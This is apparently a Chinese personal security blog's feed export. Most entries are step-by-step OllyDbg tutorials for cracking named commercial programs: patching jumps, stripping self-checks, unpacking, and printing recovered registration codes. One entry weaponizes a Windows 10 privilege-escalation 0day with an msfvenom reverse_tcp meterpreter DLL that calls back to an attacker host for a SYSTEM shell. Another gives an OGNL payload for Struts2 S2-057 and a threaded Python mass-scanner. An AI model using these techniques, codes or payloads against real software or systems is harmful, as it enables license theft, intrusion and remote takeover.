class="line">程序领空：OD左上角文件名如果文件是程序名就是程序领空</span><br><span class="line">系统领空：OD左上角文件名如果不是程序名的话就是系统领空</span><br></pre></td></tr></table></figure></p><p>系统领空<br><img src="https://s1.ax1x.com/2018/09/01/PxFoC9.md.png" alt="PxFoC9.md.png"><br>按Alt+F9或者调试按执行到用户代码跳出系统领空。<br>(跳到了程序领空)<br><img src="https://s1.ax1x.com/2018/09/01/PxF7g1.md.png" alt="PxF7g1.md.png"><br>F8单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/PxFHjx.md.png" alt="PxFHjx.md.png"><br>发现了机器码，继续单步<br>发现一个retn 跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFqu6.md.png" alt="PxFqu6.md.png"><br>继续单步<br>又跳过了一个retn之后我们又一次的进入了<code>系统领空</code><br><img src="https://s1.ax1x.com/2018/09/01/PxFLDK.md.png" alt="PxFLDK.md.png"><br>Alt+F9再次跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFx4H.md.png" alt="PxFx4H.md.png"><br>之后我们发现了我们输入的假码<br><img src="https://s1.ax1x.com/2018/09/01/PxkSCd.png" alt="PxkSCd.png"><br>继续F8到retn 跳出这个call<br>又一次出现了我们的机器码，这是不是说明真码离我们很近了呢？<br><img src="https://s1.ax1x.com/2018/09/01/PxkKvq.md.png" alt="PxkKvq.md.png"><br>发现一个可疑字符串，将其复制到剪切板，继续单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/Pxk0r6.md.png" alt="Pxk0r6.md.png"><br>在一次发现可疑字符串，记录下来。现在把OD关掉试一下注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxkqRs.md.png" alt="PxkqRs.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxAiW9.png" alt="PxAiW9.png"><br>第一次可疑字符串失败，第二个成功，所以<code>acdb9da597f5276c6e4aae7dd29b7524</code>就是注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxAEsx.png" alt="PxAEsx.png"><br>转载请声明转自：422926799.github.io<br>我们下个星期在见<img src="https://s1.ax1x.com/2018/09/01/PxAmdO.png" alt="PxAmdO.png"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解星空网游LEG阿里云破解补丁</title>
      <link href="/2018/08/31/%E7%A0%B4%E8%A7%A3%E6%98%9F%E7%A9%BA%E7%BD%91%E6%B8%B8LEG%E9%98%BF%E9%87%8C%E4%BA%91%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81/"/>
      <url>/2018/08/31/%E7%A0%B4%E8%A7%A3%E6%98%9F%E7%A9%BA%E7%BD%91%E6%B8%B8LEG%E9%98%BF%E9%87%8C%E4%BA%91%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒第七课，从这个PE中寻找真的注册码。虽然之前也说过，不过这个有点不一样。所以学习完之后这里做个总结。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3sYt.jpg" alt="Pv3sYt.jpg"></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先我们来分析一下软件，我们输入注册码后他会将注册码写入到配置文件，然后进行重启验证。<br>由此我们可以判断，他是打开ini读取里面的配置和真码进行比较。我们要做的就是将软件停留在那段时间。<br><img src="https://s1.ax1x.com/2018/08/31/Pv8E0H.md.png" alt="Pv8E0H.md.png"><br>常规操作先查壳，在载入OD。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3Tf0.png" alt="Pv3Tf0.png"><br>vmp的壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/08/31/Pv8M1f.md.png" alt="Pv8M1f.md.png"><br>在API断点下一个ReadFile断点<br><img src="https://s1.ax1x.com/2018/08/31/Pv8YAs.md.png" alt="Pv8YAs.md.png"><br>F9运行程序，发现程序成功的断在了读取文件的位置<br><img src="https://s1.ax1x.com/2018/08/31/Pv8cNR.md.png" alt="Pv8cNR.md.png"><br>Ctrl+G输入401000去到解码处，为什么要去解码处呢？因为有壳<br><img src="https://s1.ax1x.com/2018/08/31/Pv8hjO.md.png" alt="Pv8hjO.md.png"><br>中文搜索引擎-&gt;ASCII搜索-&gt;发现关键字<br><img src="https://s1.ax1x.com/2018/08/31/Pv8b4I.md.png" alt="Pv8b4I.md.png"><br>双击跳反汇编窗口，发现关键跳<br><img src="https://s1.ax1x.com/2018/08/31/PvG9Ej.md.png" alt="PvG9Ej.md.png"><br>在关键跳下断点，停止掉读取文件的断点<br><img src="https://s1.ax1x.com/2018/08/31/PvGA2V.png" alt="PvGA2V.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/08/31/PvGk80.png" alt="PvGk80.png" border="0"><br>F9运行程序，发现真码！！！<br><img src="https://s1.ax1x.com/2018/08/31/PvGaad.png" alt="PvGaad.png" border="0"><br>真码为12759E371EF9175DC77CC79BC7716312<br><img src="https://s1.ax1x.com/2018/08/31/PvGUVH.png" alt="PvGUVH.png" border="0"><br>关闭OD输入注册码，发现注册成功<br><img src="https://s1.ax1x.com/2018/08/31/PvGTMT.png" alt="PvGTMT.png" border="0"><br><img src="https://s1.ax1x.com/2018/08/31/PvGIzV.png" alt="PvGIzV.png" border="0"><br>转载请声明：来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows-提权0day-复现</title>
      <link href="/2018/08/31/windows-%E6%8F%90%E6%9D%830day-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/08/31/windows-%E6%8F%90%E6%9D%830day-%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><embed src="//music.163.com/style/swf/widget.swf?sid=33856586&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。</p><p><img src="https://s1.ax1x.com/2018/09/01/Pximdg.jpg" alt="Pximdg.jpg" border="0"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p><p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png" alt="Pxi3Q0.png" border="0"><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png"><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p><h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png"><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png"><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png"><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/09/01/PxiEsf.md.png"><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxieeS.md.png"></p><p>分析此0day的文章：<a href="https://www.anquanke.com/post/id/158293" target="_blank" rel="noopener">漏洞预警 | Windows 10本地提权0day预警 - 安全客，安全资讯平台</a><br>转载请注明来自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件巴士破解</title>
      <link href="/2018/08/29/%E6%96%87%E4%BB%B6%E5%B7%B4%E5%A3%AB%E7%A0%B4%E8%A7%A3/"/>
      <url>/2018/08/29/%E6%96%87%E4%BB%B6%E5%B7%B4%E5%A3%AB%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>看到恒大教程的第六课，vmp壳的爆破。然后按照教程上的软件找，发现完全不是一个壳。我日….啊，这篇当做复习在壳中破解吧。<br><img src="https://i.imgur.com/udnIbzS.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先查壳<br><img src="https://i.imgur.com/02YASBk.png" alt=""><br>UPX的壳，不管他。不影响大局<br>将文件巴士拖入OD<br><img src="https://i.imgur.com/dFTGw0D.png" alt=""><br>直接运行软件，然后按F9跳转到401000<br><img src="https://i.imgur.com/z0m2Fs7.png" alt=""><br>搜索关键字(注册失败）<br><img src="https://i.imgur.com/xBB90rd.png" alt=""><br>双击跳转到反汇编窗口区域<br><img src="https://i.imgur.com/hNoUCtL.png" alt=""><br>往上找跳转<br><img src="https://i.imgur.com/FtVenyN.png" alt=""><br>发现关键跳，直接跳过了正确。使用noop填充<br><img src="https://i.imgur.com/YiBYNbE.png" alt=""><br>运行软件，乱输即可注册成功<br><img src="https://i.imgur.com/Y9vHv31.png" alt=""><br>转载请声明来自:422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关键call和关键跳</title>
      <link href="/2018/08/28/%E5%85%B3%E9%94%AEcall%E5%92%8C%E5%85%B3%E9%94%AE%E8%B7%B3/"/>
      <url>/2018/08/28/%E5%85%B3%E9%94%AEcall%E5%92%8C%E5%85%B3%E9%94%AE%E8%B7%B3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>恒大的教程去到第五课，关修改关键call的值实现破解。这里也跟着学习了一遍，关键跳的上面有个关键call。而关键call是决定关键跳是否跳转的主要因素。</p><p><img src="https://i.imgur.com/HiZBHxU.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>这里用到的是教程里面的视频转换专家，百度上找一个下载。<br>首先先查壳<br><img src="https://i.imgur.com/a5ubBJ7.png" alt=""><br>查壳之后发现无壳，拖入OD进行分析。<br><img src="https://i.imgur.com/kMoWiy7.png" alt=""><br>搜索关键字”注册”，找到一个双击跳转<br><img src="https://i.imgur.com/5MqKTN6.png" alt=""><br><img src="https://i.imgur.com/UH6FmTP.png" alt=""><br>往上移看看能不能找到什么线索，发现一个跳转<br><img src="https://i.imgur.com/8i3Rh8A.png" alt=""><br>这个跳转跳过了注册成功，我们不要让他成功，可以使用Noop填充之类的操作。但是我们这次要学习的修改call的值，我们看看上面的call。下个断点，然后F9运行程序输入假码看看。<br><img src="https://i.imgur.com/CcaSR3l.png" alt=""><br>从call中我们可以发现，里面有我们输入的假码。F8单步像下看看<br><img src="https://i.imgur.com/H9oJZqc.png" alt=""><br>test al,al 可以看出EAX和ECX在进行比较。如果为1则注册成功，如果为0则注册不成功。而这一切的罪魁祸首就是call，所以我们进入call中进行修改(手动滑稽啦)<br><img src="https://i.imgur.com/bxQQwIT.jpg" alt=""><br>F7进入call<br><img src="https://i.imgur.com/Ek3PAwh.png" alt=""><br>修改如下图所示<br>mov eax,1(将1赋值给eax) retn（退出call）<br><img src="https://i.imgur.com/H11hDP7.png" alt=""><br>然后选择修改的部分复制到可执行文件，将其保存。<br><img src="https://i.imgur.com/Dkdk4bL.png" alt=""><br>发现已经按不了了，代表已经注册了。</p><p>转载请注明:来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除文件自效验</title>
      <link href="/2018/08/27/%E5%8E%BB%E9%99%A4%E6%96%87%E4%BB%B6%E8%87%AA%E6%95%88%E9%AA%8C/"/>
      <url>/2018/08/27/%E5%8E%BB%E9%99%A4%E6%96%87%E4%BB%B6%E8%87%AA%E6%95%88%E9%AA%8C/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学到Shark恒的第四课，去除文件自效验。何为文件自效验呢？当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于<br>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。<br><img src="https://i.imgur.com/cqRHQZL.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载课程中所用到的，木马杀客</p><pre><code>http://www.xdowns.com/soft/8/21/2006/Soft_29666.html</code></pre><p>首先下载出来之后。我们把exe拖入进行检测，发现有个壳子。<br><img src="https://i.imgur.com/qQO7Bfi.png" alt=""><br>拖入OD，发现可以用ESP定律脱掉(ESP定律昨天我已经说过了这里就不重复多说)<br><img src="https://i.imgur.com/MIUZtOT.png" alt=""><br>脱掉壳之后的对比和大小<br><img src="https://i.imgur.com/unSY03R.png" alt=""></p><p><img src="https://i.imgur.com/0Y0iO8j.png" alt=""><br>运行1.exe发现打不开(判断有文件自效验)。将1.exe拖入OD，点击常用API断点设置，设置文件大小断点。<br><img src="https://i.imgur.com/Z5yzVqr.png" alt=""><br>F9运行。<br><img src="https://i.imgur.com/509GloA.png" alt=""><br>右键反汇编窗口跟随<br><img src="https://i.imgur.com/OiZDMpG.png" alt=""><br>跳到判断参数，下断点<br><img src="https://i.imgur.com/Ulg1W0P.png" alt=""><br>将文件大小那个断点禁止。<br><img src="https://i.imgur.com/InDNk8n.png" alt=""><br>F9运行，发现断在了这个位置<br><img src="https://i.imgur.com/bKb8LPi.png" alt=""><br>F8单步…<br><img src="https://i.imgur.com/Wo0uEki.png" alt=""><br>（cmp:cmp用于比较两个数值的大小，如果不是加壳后的大小则会直接return退出）这里我们不能让他退出，对两个cmp使用noop填充。<br><img src="https://i.imgur.com/xiRWY4c.png" alt=""><br>复制到可执行文件然后保存<br><img src="https://i.imgur.com/luAvfEa.png" alt=""><br>保存为2.exe<br><img src="https://i.imgur.com/5gh69iv.png" alt=""><br>成功打开<br><img src="https://i.imgur.com/33Z3fqB.png" alt=""><br>转载请注明转自:422926799.github.io<br>欢迎加入即刻安全技术交流群:307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ESP定律</title>
      <link href="/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/"/>
      <url>/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒的教程，学到第四课，自验证涉及到ESP定律进行脱壳。然后我去看了一遍，发现还行。这里做个总结。</p><p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4065195853,3923124275&amp;fm=11&amp;gp=0.jpg" alt=""></p><pre><code>全职猎人看到了嵌合蚁篇</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先这里自己找个exe用吾爱工具的，ASP加壳工具进行加壳。用PEID查壳可以发现是ASP壳<br><img src="https://i.imgur.com/AP2j6lR.png" alt=""><br>拖入OD，并进行一次单步，发现有Pushad而且单步之后也只有ESP后面出现红色说明可以使用ESP定律进行脱壳<br><img src="https://i.imgur.com/k2RDX53.png" alt=""><br>然后将鼠标移到ESP值那里右键单击数据窗口中跟随<br><img src="https://i.imgur.com/8aQCmo2.png" alt=""><br>选中跟随的值，多少无所谓只要是开头的就行<br><img src="https://i.imgur.com/uwvXxbY.png" alt=""><br>右键单击断点，硬件断点，三选一<br><img src="https://i.imgur.com/2jsRRPp.png" alt=""><br>断点之后按调试-&gt;硬件断点可以看见<br><img src="https://i.imgur.com/MRJtmJH.png" alt=""><br>按F9运行，然后F8单步(让他跳到call)<br><img src="https://i.imgur.com/mtcu2kb.png" alt=""><br>鼠标右键点击插件进行脱壳，保存<br><img src="https://i.imgur.com/THC7jZC.png" alt=""><br>在次查壳，发现已经脱了。<br><img src="https://i.imgur.com/finyVAV.png" alt=""></p><p>ESP定律还有更简单的方法，就是你单步了之后把鼠标移到ESP值那里选择ESP那个插件，然后步骤同上。</p><p>转载请注明来自：422926799.github.io</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>破解飞扬英语2010版</title>
      <link href="/2018/08/25/%E7%A0%B4%E8%A7%A3%E9%A3%9E%E6%89%AC%E8%8B%B1%E8%AF%AD2010%E7%89%88/"/>
      <url>/2018/08/25/%E7%A0%B4%E8%A7%A3%E9%A3%9E%E6%89%AC%E8%8B%B1%E8%AF%AD2010%E7%89%88/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>每天睡觉前看个Shark恒的破解教程，起床来学破解。真特么的爽歪歪，我看到了第三课，然后我们就来破解吧。<br><img src="https://i.imgur.com/EyXI3m8.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载教程里面所说的exe，飞扬英语学习(带壳破解)：</p><pre><code>http://www.greenxf.com/soft/20907.html</code></pre><p>之后先安装，查壳。<br><img src="https://i.imgur.com/KjtpqsM.png" alt=""><br>运行exe点击购买，随便输用户名和注册码<br><img src="https://i.imgur.com/4Ixm1qZ.png" alt=""><br>然后软件会让你重启<br><img src="https://i.imgur.com/L6AyPWF.png" alt=""><br>之后将软件拖入到OD，打开<br><img src="https://i.imgur.com/RBMX7A9.png" alt=""><br>因为是带壳所以会出现以上毛病，点是或否就行，然后F9运行<br><img src="https://i.imgur.com/IPkTpGj.png" alt=""><br>回到教程，按Ctrl+G或者黑色的箭头-&gt;输入401000<br><img src="https://i.imgur.com/ZFaU1B3.png" alt=""><br>(401000跳转到头部，根据Shark恒所说%90的壳可以成功)<br><img src="https://i.imgur.com/3iZF6do.png" alt=""><br>然后可以看见脱离了壳<br><img src="https://i.imgur.com/zhBIgmi.png" alt=""><br>点击分析-&gt;从模块中删除数据分析<br><img src="https://i.imgur.com/zBcE7FY.jpg" alt=""><br>就会恢复正常，然后中文搜索-&gt;智能搜索（未购买）<br><img src="https://i.imgur.com/ZZ7UqQP.png" alt=""><br>双击跳转到CPU区<br><img src="https://i.imgur.com/rPXGmYP.png" alt=""><br>向上找找存储的地方，然后发现了注册表的路径，我们给他加个注释<br><img src="https://i.imgur.com/P1mfRXv.png" alt=""><br>然后F2断点<br><img src="https://i.imgur.com/KB5S9az.png" alt=""><br>按那个嘿嘿的返回键，返回，点击插件-&gt;常用API插件找到启动断点的<br><img src="https://i.imgur.com/FpgBtbQ.jpg" alt=""><br>因为有壳所有会出现以下这点（确认即可）<br><img src="https://i.imgur.com/7DUfyoD.png" alt=""></p><p><img src="https://i.imgur.com/nDtcQ4p.png" alt=""><br>按F9运行<br><img src="https://i.imgur.com/2dWYuEd.png" alt=""><br>然后按OD列表上方的b按钮，跳到断点设置将获取启动信息的断点停止，注册表设置的断点启动。<br><img src="https://i.imgur.com/av5V7q6.png" alt=""><br><img src="https://i.imgur.com/jkoO7rv.png" alt=""><br>之后返回到反汇编区，按F9再次运行，发现断点成功断到了注册表那里<br><img src="https://i.imgur.com/JtZRacM.png" alt=""><br>慢慢的往下面单步就可以发现真码了（注册码）<br><img src="https://i.imgur.com/nylj5Q1.png" alt=""></p><p><img src="https://i.imgur.com/gWTHuOf.png" alt=""></p><p><img src="https://i.imgur.com/XHF5j1G.png" alt=""></p><p><img src="https://i.imgur.com/vfb0kXt.png" alt=""><br>复制出真码将其注册<br><img src="https://i.imgur.com/W5iYK7q.png" alt=""></p><p><img src="https://i.imgur.com/hDckGp3.png" alt=""></p><p><img src="https://i.imgur.com/Cf5Gb6P.png" alt=""></p><p>破解成功（带壳寻找注册码）。</p><p>这三天来的总结</p><pre><code>带壳寻找注册码（90%的壳可以用401000找到初始位）PEID查壳，把exe拖入OD，直接运行程序。因为带壳，按Ctrl+g或黑色的向前指的箭头，输入401000。如果未解码，则按分析-&gt;删除模块分析然后进行智能搜索搜索关键字（未购买），然后双击跳到CPU区。往上寻找“注册表的路径”。找到之后按F2下好断点，之后按&lt;&lt;&lt;退回键按API断点工具-&gt;常用断点工具-&gt;常用断点工具，勾选&quot;初始化断点&quot;确定。按F9发现程序被断了，之后在OD上方列表找到b。按b将初始化断点禁用，注册表那个断点开启，然后按F9，跳到注册表那个断点哪里。按F8进行单步调试，之后你会看到假码和真码，一般来说如果有真码的话CPU区的左侧第三栏会出现一个0x几的。然后发现下一步是对比用户名和真码，这就是真码了。Shark恒的第三课利用了，软件在输入后重启那段空间把软件进行断了下来然后搜索真码存在的路径，进行调试从而找到真码破解不联网登陆软件常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</code></pre><p>转载请注明文章来自：422926799.github.io<br>欢迎加入即刻安全技术交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解劳保用户管理系统</title>
      <link href="/2018/08/24/%E7%A0%B4%E8%A7%A3%E5%8A%B3%E4%BF%9D%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2018/08/24/%E7%A0%B4%E8%A7%A3%E5%8A%B3%E4%BF%9D%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天在即刻群里面窥屏，发现一个shark恒的破解教程。我用“念”去查看，嗯发现这是个不错的东西（完全扯淡），昨天晚上就看了。心里痒想破解（手动滑稽），今天下午找到了劳保管理系统2012的软件，破解成功了。故此来做个记录<br><img src="https://i.imgur.com/IHsMSOc.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先劳保软件管理系统下载：<a href="http://www.duote.com/soft/121.html" target="_blank" rel="noopener">http://www.duote.com/soft/121.html</a><br>准备好工具，OD，EXEInfoPE或者PEID<br>按照昨天学习的操作：</p><pre><code>先查壳，将下载好的exe拖入EXEInfoPE查壳（我这里用的是EXEInfoPE）</code></pre><p><img src="https://i.imgur.com/1OVe1zG.png" alt=""><br>没有壳，进行软件测试。</p><pre><code>打开界面，瞎输，发现有4次机会，如果全部错误则会弹出登陆框</code></pre><p><img src="https://i.imgur.com/FzvkjGy.png" alt=""></p><p><img src="https://i.imgur.com/wEbItRg.png" alt=""><br>继续回到昨天的操作，将exe拖入到OD里面<br><img src="https://i.imgur.com/oPwcGHf.png" alt=""><br>进行字符搜索，搜索关键字：密码错误<br><img src="https://i.imgur.com/vKi8lYJ.png" alt=""><br>双击跳到，CPU区。<br><img src="https://i.imgur.com/C6mF7FE.png" alt=""></p><pre><code>从图中可以看出 &gt; //跳转符还有红色的线代表跳转，灰色的线代表跳转不成功</code></pre><p>现在移到红线的上方<br><img src="https://i.imgur.com/EFZFAsD.png" alt=""><br>jnz代表条件跳转<br><img src="https://i.imgur.com/9h0x7X8.png" alt=""><br>然后我们下个断点，进行软件运行测试。<br><img src="https://i.imgur.com/wgg4U5B.png" alt=""><br>运行软件，发现断点的地方变成白底红字（说明软件运行在这了）<br><img src="https://i.imgur.com/VX9WTO7.png" alt=""><br>F8单步调试，看看<br><img src="https://i.imgur.com/bourawt.png" alt=""><br>跳转到了密码错误，在回到昨天晚上学习的操作，在断点处进行Noop填充<br><img src="https://i.imgur.com/HFK6Exo.png" alt=""><br>noop填充就是，等于把这个跳转删除了。然后在单步看看<br><img src="https://i.imgur.com/enL8Ce4.png" alt=""><br>跳过了密码错误，我们在运行软件看看</p><p>乱输一通，发现登陆成功了！！！<br><img src="https://i.imgur.com/sfeDmnM.png" alt=""><br><img src="https://i.imgur.com/9ZJUHyh.png" alt=""><br>然后破解的软件即可。</p><p><strong>总结：</strong></p><pre><code>逆向第一课总结:1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;，然后进行noop填聪(就是什么也没有)，然后软件就破解了。自己可以考虑用C写个简单的登陆程序，进行破解。完毕注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</code></pre><p>欢迎加入即刻安全技术交流群：307283889<br>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>St2-057复现</title>
      <link href="/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/08/23/St2-057%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>距离愉快的暑假还有10天左右、、十分不想上学…..,今天呢st-057的细节和复现教程出炉了。抱着一试的决心，emm失败了。还好下午有为潜水大佬出来送了份环境<br><img src="https://i.imgur.com/yT2oSJ3.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>漏洞介绍：<br><img src="https://i.imgur.com/WCtYf57.png" alt=""><br>漏洞详情：</p><pre><code>https://github.com/vulhub/vulhub/tree/master/struts2/s2-048https://lgtm.com/blog/apache_struts_CVE-2018-11776https://cwiki.apache.org/confluence/display/WW/S2-057https://www.anquanke.com/post/id/157518</code></pre><p><strong>搭建st2-057环境：</strong><br>这里有两种方法：</p><pre><code>1.按照少宇师傅的方法来搭建，但是我失败了。链接：https://github.com/jas502n/St2-057/2.用潜水大佬给我的环境，环境下载：https://pan.baidu.com/s/1lXIHwqEQP-bjqw5A4fvOIA 密码: b7k6 github下载地址：https://github.com/422926799/st2-057</code></pre><p>如果你选择按照少宇师傅的搭建方法则看<a href="https://github.com/jas502n/St2-057/" target="_blank" rel="noopener">https://github.com/jas502n/St2-057/</a></p><p>回到正题，下载之后。</p><pre><code>unzip cve201811776.zipdocker-compose up -d</code></pre><p>访问：<a href="http://127.0.0.1/struts2-showcase" target="_blank" rel="noopener">http://127.0.0.1/struts2-showcase</a><br><img src="https://i.imgur.com/BZmoCIq.png" alt=""><br>根据少宇师傅的教程，加入payload${(111+111)}</p><pre><code>http://www.127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action</code></pre><p>然后测试结果如下：<br><img src="https://i.imgur.com/8L24a6G.png" alt=""><br><img src="https://i.imgur.com/zciP0nQ.png" alt=""><br>其他payload我试了不行，如果要试请自行测试。</p><p>然后我们可以通过上面的那个payload写一个批量测试St2-057的脚本：<br><strong>代码：</strong></p><pre><code>import requestsimport threadingimport osxh=open(&apos;save.txt&apos;,&apos;w&apos;)xh.close()def scan(url):    payload=&apos;${(111+111)}&apos;    urls=&apos;{}/struts2-showcase&apos;.format(url)+&apos;/struts2-showcase/{}/actionChain1.action&apos;.format(payload)    headers={&apos;user-aget&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    try:        reqt=requests.get(url=urls,headers=headers,timeout=10)        if &apos;{}/struts2-showcase/struts2-showcase/222/register2.action&apos;.format(url) == reqt.url: //判断是否等于相加的结果            print(&apos;[+]st-057 url:{}&apos;.format(reqt.url))            print(&apos;[+]st-057 url:{}&apos;.format(reqt.url),file=open(&apos;save.txt&apos;,&apos;a&apos;))        else:            print(&apos;[-]Not st-057 url:{}&apos;.format(reqt.url))    except Exception as e:        print(&apos;[-]Error {}&apos;.format(e))if __name__ == &apos;__main__&apos;:    while True:        user=input(&apos;url.txt:&apos;)        if os.path.exists(user):            print(&apos;[+]{} existence&apos;.format(user))            break        else:            print(&apos;[-]Not existence {}&apos;.format(user))            continue    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        t=threading.Thread(target=scan,args=(qc,))        t.start()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/x4A6ilJ.png" alt=""></p><p>转载请注明来自:422926799.github.io<br>欢迎加入即刻安全交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
